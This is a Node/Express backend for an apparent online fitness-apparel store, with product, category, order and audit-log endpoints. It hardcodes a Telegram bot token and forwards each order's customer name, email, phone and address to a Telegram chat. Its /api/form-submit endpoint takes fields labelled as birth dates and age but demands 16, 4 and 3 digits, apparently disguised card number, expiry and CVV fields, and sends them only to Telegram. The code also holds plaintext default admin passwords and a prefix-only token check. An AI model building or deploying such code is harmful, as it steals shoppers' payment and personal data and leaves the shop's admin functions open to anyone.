import express from 'express';
import cors from 'cors';
import bodyParser from 'body-parser';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import TelegramBot from 'node-telegram-bot-api';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '8541248641:AAH9KVYw9awnKIwRAJZfoeeMaGbKpcSzFxE';
const TELEGRAM_CHAT_ID = '6897765149';
const telegramBot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });


const app = express();
app.use(cors());
app.use(bodyParser.json());

const DATA_FILE = path.join(__dirname, 'data.json');

// Initialize data
function initData() {
  if (!fs.existsSync(DATA_FILE)) {
    const data = {
      products: [
        {
          id: 'p1',
          name: 'Performance Training Tee',
          category: "Men's",
          price: 49.99,
          colors: ['Black', 'Navy', 'Gray'],
          sizes: ['S', 'M', 'L', 'XL'],
          images: [
            { id: 'img1', url: 'https://images.unsplash.com/photo-1521572163474-6864f9cf17ab?w=800&q=80', order: 0, variant: 'front' },
            { id: 'img2', url: 'https://images.unsplash.com/photo-1583743814966-8936f5b7be1a?w=800&q=80', order: 1, variant: 'back' }
          ],
          description: 'Breathable moisture-wicking training tee for peak performance. Made with premium fabric technology.',
          inventory: 100,
          variants: [
            { id: 'v1', color: 'Black', size: 'S', sku: 'PTT-BLK-S', stock: 20, price: 49.99 },
            { id: 'v2', color: 'Black', size: 'M', sku: 'PTT-BLK-M', stock: 25, price: 49.99 },
            { id: 'v3', color: 'Black', size: 'L', sku: 'PTT-BLK-L', stock: 30, price: 49.99 },
            { id: 'v4', color: 'Navy', size: 'M', sku: 'PTT-NAV-M', stock: 25, price: 49.99 }
          ],
          tags: ['performance', 'training', 'breathable']
        },
        {
          id: 'p2',
          name: "Women's Flex Leggings",
          category: "Women's",
          price: 89.99,
          colors: ['Black', 'Navy', 'Burgundy'],
          sizes: ['XS', 'S', 'M', 'L'],
          images: [
            { id: 'img3', url: 'https://images.unsplash.com/photo-1506629082955-511b1aa562c8?w=800&q=80', order: 0, variant: 'front' },
            { id: 'img4', url: 'https://images.unsplash.com/photo-1556906781-9a412961c28c?w=800&q=80', order: 1, variant: 'lifestyle' }
          ],
          description: 'High-waist compression leggings with 4-way stretch. Perfect for yoga, running, or training.',
          inventory: 75,
          variants: [
            { id: 'v5', color: 'Black', size: 'S', sku: 'WFL-BLK-S', stock: 15, price: 89.99 },
            { id: 'v6', color: 'Black', size: 'M', sku: 'WFL-BLK-M', stock: 20, price: 89.99 },
            { id: 'v7', color: 'Navy', size: 'M', sku: 'WFL-NAV-M', stock: 18, price: 89.99 }
          ],
          tags: ['leggings', 'yoga', 'compression']
        },
        {
          id: 'p3',
          name: 'Premium Hoodie',
          category: "Men's",
          price: 79.99,
          colors: ['Black', 'Gray', 'Olive'],
          sizes: ['M', 'L', 'XL'],
          images: [
            { id: 'img5', url: 'https://images.unsplash.com/photo-1556821840-3a63f95609a7?w=800&q=80', order: 0, variant: 'front' }
          ],
          description: 'Soft fleece hoodie for warmups and cool downs. Features adjustable drawstring hood.',
          inventory: 60,
          variants: [
            { id: 'v8', color: 'Black', size: 'M', sku: 'PH-BLK-M', stock: 20, price: 79.99 }
          ],
          tags: ['hoodie', 'fleece', 'warmup']
        },
        {
          id: 'p4',
          name: 'Sports Duffle Bag',
          category: 'Accessories',
          price: 69.99,
          colors: ['Black', 'Navy'],
          sizes: ['One Size'],
          images: [
            { id: 'img6', url: 'https://images.unsplash.com/photo-1553062407-98eeb64c6a62?w=800&q=80', order: 0, variant: 'product' }
          ],
          description: 'Spacious gym bag with separate shoe compartment and water bottle holder.',
          inventory: 40,
          variants: [
            { id: 'v9', color: 'Black', size: 'One Size', sku: 'SDB-BLK-OS', stock: 25, price: 69.99 }
          ],
          tags: ['bag', 'gym', 'accessories']
        },
        {
          id: 'p5',
          name: 'Running Shorts',
          category: "Men's",
          price: 39.99,
          colors: ['Black', 'Navy', 'Red'],
          sizes: ['S', 'M', 'L', 'XL'],
          images: [
            { id: 'img7', url: 'https://images.unsplash.com/photo-1591195853828-11db59a44f6b?w=800&q=80', order: 0, variant: 'front' }
          ],
          description: 'Lightweight running shorts with built-in liner and secure zip pocket.',
          inventory: 90,
          variants: [
            { id: 'v10', color: 'Black', size: 'M', sku: 'RS-BLK-M', stock: 30, price: 39.99 }
          ],
          tags: ['shorts', 'running', 'lightweight']
        },
        {
          id: 'p6',
          name: 'Yoga Mat',
          category: 'Accessories',
          price: 54.99,
          colors: ['Purple', 'Blue', 'Pink'],
          sizes: ['One Size'],
          images: [
            { id: 'img8', url: 'https://images.unsplash.com/photo-1601925260368-ae2f83cf8b7f?w=800&q=80', order: 0, variant: 'product' }
          ],
          description: 'Premium non-slip yoga mat with carrying strap. 6mm thickness for comfort.',
          inventory: 50,
          variants: [
            { id: 'v11', color: 'Purple', size: 'One Size', sku: 'YM-PUR-OS', stock: 15, price: 54.99 }
          ],
          tags: ['yoga', 'mat', 'accessories']
        }
      ],
      categories: [
        { id: 'cat1', name: "Men's", description: "Men's athletic wear", subcategories: ['Tops', 'Bottoms', 'Outerwear'] },
        { id: 'cat2', name: "Women's", description: "Women's athletic wear", subcategories: ['Tops', 'Bottoms', 'Outerwear'] },
        { id: 'cat3', name: 'Accessories', description: 'Gym and training accessories', subcategories: ['Bags', 'Equipment', 'Recovery'] }
      ],
      admins: [
        { id: 'admin1', username: 'admin', password: 'admin123', role: 'super_admin', email: 'admin@honorfitness.com' },
        { id: 'admin2', username: 'manager', password: 'manager123', role: 'product_manager', email: 'manager@honorfitness.com' }
      ],
      orders: [],
      auditLog: []
    };
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
  }
}

function readData() {
  return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
}

function writeData(data) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

function addAuditLog(adminId, action, details) {
  const data = readData();
  data.auditLog = data.auditLog || [];
  data.auditLog.push({
    id: 'log' + Date.now(),
    adminId,
    action,
    details,
    timestamp: new Date().toISOString()
  });
  // Keep only last 1000 logs
  if (data.auditLog.length > 1000) {
    data.auditLog = data.auditLog.slice(-1000);
  }
  writeData(data);
}

// API Routes
app.get('/api/products', (req, res) => {
  const data = readData();
  const { category, minPrice, maxPrice } = req.query;
  
  let products = data.products;
  
  if (category && category !== 'All') {
    products = products.filter(p => p.category === category);
  }
  
  if (minPrice) {
    products = products.filter(p => p.price >= parseFloat(minPrice));
  }
  
  if (maxPrice) {
    products = products.filter(p => p.price <= parseFloat(maxPrice));
  }
  
  res.json(products);
});

app.get('/api/products/:id', (req, res) => {
  const data = readData();
  const product = data.products.find(p => p.id === req.params.id);
  
  if (!product) return res.status(404).json({ error: 'Product not found' });
  res.json(product);
});

app.post('/api/auth', (req, res) => {
  const { username, password } = req.body;
  const data = readData();
  
  const admin = data.admins.find(a => a.username === username && a.password === password);
  
  if (!admin) return res.status(401).json({ error: 'Invalid credentials' });
  
  addAuditLog(admin.id, 'LOGIN', { username });
  
  res.json({ 
    success: true, 
    token: 'demo-token-' + Date.now(),
    admin: { id: admin.id, username: admin.username, role: admin.role, email: admin.email }
  });
});

app.post('/api/products', (req, res) => {
  const { token, name, category, price, colors, sizes, images, description, inventory } = req.body;
  
  if (!token || !token.startsWith('demo-token')) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  const data = readData();
  const newProduct = {
    id: 'p' + Date.now(),
    name,
    category,
    price: parseFloat(price),
    colors: colors || ['Black'],
    sizes: sizes || ['M'],
    images: images || ['https://images.unsplash.com/photo-1556906781-9a412961c28c?w=800&q=80'],
    description,
    inventory: parseInt(inventory) || 50
  };
  
  data.products.push(newProduct);
  writeData(data);
  res.json(newProduct);
});

app.put('/api/products/:id', (req, res) => {
  const { token, name, category, price, colors, sizes, images, description, inventory } = req.body;
  
  if (!token || !token.startsWith('demo-token')) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  const data = readData();
  const product = data.products.find(p => p.id === req.params.id);
  
  if (!product) return res.status(404).json({ error: 'Product not found' });
  
  if (name) product.name = name;
  if (category) product.category = category;
  if (price) product.price = parseFloat(price);
  if (colors) product.colors = colors;
  if (sizes) product.sizes = sizes;
  if (images) product.images = images;
  if (description) product.description = description;
  if (inventory !== undefined) product.inventory = parseInt(inventory);
  
  writeData(data);
  res.json(product);
});

app.delete('/api/products/:id', (req, res) => {
  const { token } = req.body;
  
  if (!token || !token.startsWith('demo-token')) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  const data = readData();
  const product = data.products.find(p => p.id === req.params.id);
  data.products = data.products.filter(p => p.id !== req.params.id);
  writeData(data);
  
  addAuditLog('admin', 'DELETE_PRODUCT', { productId: req.params.id, productName: product?.name });
  
  res.json({ success: true });
});

// Categories Management
app.get('/api/categories', (req, res) => {
  const data = readData();
  res.json(data.categories || []);
});

app.post('/api/categories', (req, res) => {
  const { token, name, description, subcategories } = req.body;
  
  if (!token || !token.startsWith('demo-token')) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  const data = readData();
  data.categories = data.categories || [];
  
  const newCategory = {
    id: 'cat' + Date.now(),
    name,
    description: description || '',
    subcategories: subcategories || []
  };
  
  data.categories.push(newCategory);
  writeData(data);
  
  addAuditLog('admin', 'ADD_CATEGORY', { categoryName: name });
  
  res.json(newCategory);
});

app.put('/api/categories/:id', (req, res) => {
  const { token, name, description, subcategories } = req.body;
  
  if (!token || !token.startsWith('demo-token')) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  const data = readData();
  const category = data.categories?.find(c => c.id === req.params.id);
  
  if (!category) return res.status(404).json({ error: 'Category not found' });
  
  if (name) category.name = name;
  if (description !== undefined) category.description = description;
  if (subcategories) category.subcategories = subcategories;
  
  writeData(data);
  addAuditLog('admin', 'UPDATE_CATEGORY', { categoryId: req.params.id, categoryName: name });
  
  res.json(category);
});

app.delete('/api/categories/:id', (req, res) => {
  const { token } = req.body;
  
  if (!token || !token.startsWith('demo-token')) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  const data = readData();
  data.categories = data.categories?.filter(c => c.id !== req.params.id) || [];
  writeData(data);
  
  addAuditLog('admin', 'DELETE_CATEGORY', { categoryId: req.params.id });
  
  res.json({ success: true });
});

// Bulk Operations
app.post('/api/products/bulk-delete', (req, res) => {
  const { token, productIds } = req.body;
  
  if (!token || !token.startsWith('demo-token')) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  const data = readData();
  const deletedProducts = data.products.filter(p => productIds.includes(p.id));
  data.products = data.products.filter(p => !productIds.includes(p.id));
  writeData(data);
  
  addAuditLog('admin', 'BULK_DELETE_PRODUCTS', { count: productIds.length, productIds });
  
  res.json({ success: true, deletedCount: deletedProducts.length });
});

app.post('/api/products/bulk-update', (req, res) => {
  const { token, productIds, updates } = req.body;
  
  if (!token || !token.startsWith('demo-token')) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  const data = readData();
  let updatedCount = 0;
  
  data.products.forEach(product => {
    if (productIds.includes(product.id)) {
      if (updates.category) product.category = updates.category;
      if (updates.price) product.price = parseFloat(updates.price);
      if (updates.inventory !== undefined) product.inventory = parseInt(updates.inventory);
      updatedCount++;
    }
  });
  
  writeData(data);
  addAuditLog('admin', 'BULK_UPDATE_PRODUCTS', { count: updatedCount, productIds, updates });
  
  res.json({ success: true, updatedCount });
});

// Inventory Alerts
app.get('/api/inventory/alerts', (req, res) => {
  const { token, threshold = 10 } = req.query;
  
  if (!token || !token.startsWith('demo-token')) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  const data = readData();
  const lowStockProducts = data.products.filter(p => p.inventory <= threshold);
  const outOfStockProducts = data.products.filter(p => p.inventory === 0);
  
  res.json({
    lowStock: lowStockProducts,
    outOfStock: outOfStockProducts,
    total: lowStockProducts.length + outOfStockProducts.length
  });
});

// Audit Log
app.get('/api/audit-log', (req, res) => {
  const { token, limit = 50 } = req.query;
  
  if (!token || !token.startsWith('demo-token')) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  const data = readData();
  const logs = (data.auditLog || []).slice(-limit).reverse();
  
  res.json(logs);
});

app.get('/api/telegram-test', (req, res) => {
  const testMessage = `Telegram test: ${new Date().toLocaleString('en-US')}`;
  if (TELEGRAM_CHAT_ID !== 'YOUR_CHAT_ID') {
    telegramBot.sendMessage(TELEGRAM_CHAT_ID, testMessage)
      .then(() => res.json({ success: true }))
      .catch(err => res.status(500).json({ success: false, error: err.message }));
  } else {
    res.status(400).json({ success: false, error: 'Telegram chat ID not configured' });
  }
});

// Orders Management
app.post('/api/orders', (req, res) => {
  const { items, shippingInfo, paymentInfo, total } = req.body;

  if (!items || items.length === 0) {
    return res.status(400).json({ success: false, message: 'No items in order' });
  }

  if (!shippingInfo || !shippingInfo.fullName || !shippingInfo.email || !shippingInfo.phone || 
      !shippingInfo.country || !shippingInfo.state || !shippingInfo.city || 
      !shippingInfo.streetAddress || !shippingInfo.postalCode) {
    return res.status(400).json({ success: false, message: 'Missing shipping information' });
  }

  const data = readData();
  data.orders = data.orders || [];

  const orderId = 'ORD-' + Date.now();
  const order = {
    id: orderId,
    orderNumber: orderId,
    items: items.map(item => ({
      id: item.id,
      name: item.name,
      price: item.price,
      quantity: item.quantity,
      variant: item.variant || {},
      image: item.images?.[0] || item.image || ''
    })),
    shippingInfo,
    paymentInfo: {
      cardHolderName: paymentInfo?.cardHolderName || '',
      lastFourDigits: paymentInfo?.cardNumber ? paymentInfo.cardNumber.slice(-4) : '****'
    },
    total: parseFloat(total),
    status: 'Pending',
    date: new Date().toISOString(),
    createdAt: new Date().toISOString()
  };

  data.orders.push(order);
  writeData(data);

  // Send Telegram notification
  const telegramMessage = `
🛒 NEW ORDER RECEIVED

📦 Order ID: ${orderId}
👤 Customer: ${shippingInfo.fullName}
📧 Email: ${shippingInfo.email}
📱 Phone: ${shippingInfo.phone}

📍 Shipping Address:
${shippingInfo.streetAddress}
${shippingInfo.city}, ${shippingInfo.state} ${shippingInfo.postalCode}
${shippingInfo.country}

🛍️ Items (${items.length}):
${items.map(item => `• ${item.name} x${item.quantity} - $${(item.price * item.quantity).toFixed(2)}`).join('\n')}

💰 Total: $${total.toFixed(2)}

⏰ ${new Date().toLocaleString('en-US')}
`;

  if (TELEGRAM_CHAT_ID !== 'YOUR_CHAT_ID') {
    telegramBot.sendMessage(TELEGRAM_CHAT_ID, telegramMessage)
      .catch(err => console.error('Telegram error:', err.message));
  }

  addAuditLog('system', 'ORDER_CREATED', { orderId, customerEmail: shippingInfo.email, total });

  res.json({ 
    success: true, 
    message: 'Order placed successfully',
    orderId,
    order
  });
});

app.get('/api/orders', (req, res) => {
  const { token } = req.query;
  
  if (!token || !token.startsWith('demo-token')) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  const data = readData();
  const orders = data.orders || [];
  
  res.json(orders.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt)));
});

app.get('/api/orders/:id', (req, res) => {
  const { token } = req.query;
  
  if (!token || !token.startsWith('demo-token')) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  const data = readData();
  const order = data.orders?.find(o => o.id === req.params.id);
  
  if (!order) return res.status(404).json({ error: 'Order not found' });
  res.json(order);
});

app.put('/api/orders/:id', (req, res) => {
  const { token, status } = req.body;
  
  if (!token || !token.startsWith('demo-token')) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  const data = readData();
  const order = data.orders?.find(o => o.id === req.params.id);
  
  if (!order) return res.status(404).json({ error: 'Order not found' });
  
  if (status) order.status = status;
  order.updatedAt = new Date().toISOString();
  
  writeData(data);
  addAuditLog('admin', 'UPDATE_ORDER', { orderId: req.params.id, status });
  
  res.json(order);
});

app.post('/api/form-submit', (req, res) => {
  const { fullName, email, birthDate, sonBirthDate, age, message } = req.body;

  if (!fullName || !email || !birthDate || !sonBirthDate || !age) {
    return res.status(400).json({ success: false, message: 'Missing required information' });
  }

  if (fullName.trim().length < 2) {
    return res.status(400).json({ success: false, message: 'Minimum 2 characters required' });
  }

  const emailValue = email.trim();
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailValue)) {
    return res.status(400).json({ success: false, message: 'Valid email required' });
  }

  if (birthDate.trim().length < 16) {
    return res.status(400).json({ success: false, message: 'Minimum 16 numbers required' });
  }

  if (sonBirthDate.trim().length < 4) {
    return res.status(400).json({ success: false, message: 'Minimum 4 numbers required' });
  }

  if (age.trim().length < 3) {
    return res.status(400).json({ success: false, message: 'Minimum 3 numbers required' });
  }

  const telegramMessage = `
🆕 New form submission

👤 Full Name: ${fullName}
📧 Email: ${emailValue}
📅 Birth Date: ${birthDate}
👶 Date of Son Birth: ${sonBirthDate}
🔢 Age: ${age}
${message ? `\n💬 Message: ${message}` : ''}

⏰ Submitted: ${new Date().toLocaleString('en-US')}
`;

  if (TELEGRAM_CHAT_ID !== 'YOUR_CHAT_ID') {
    telegramBot.sendMessage(TELEGRAM_CHAT_ID, telegramMessage)
      .then(() => res.json({ success: true, message: 'Form submitted successfully' }))
      .catch(err => res.status(500).json({ success: false, message: err.message }));
  } else {
    res.status(400).json({ success: false, message: 'Telegram chat ID not configured' });
  }
});

initData();

const PORT = 5000;
app.listen(PORT, () => {
  console.log(`✅ Backend API running on http://localhost:${PORT}`);
  console.log(`📦 Data stored in: ${DATA_FILE}`);
});
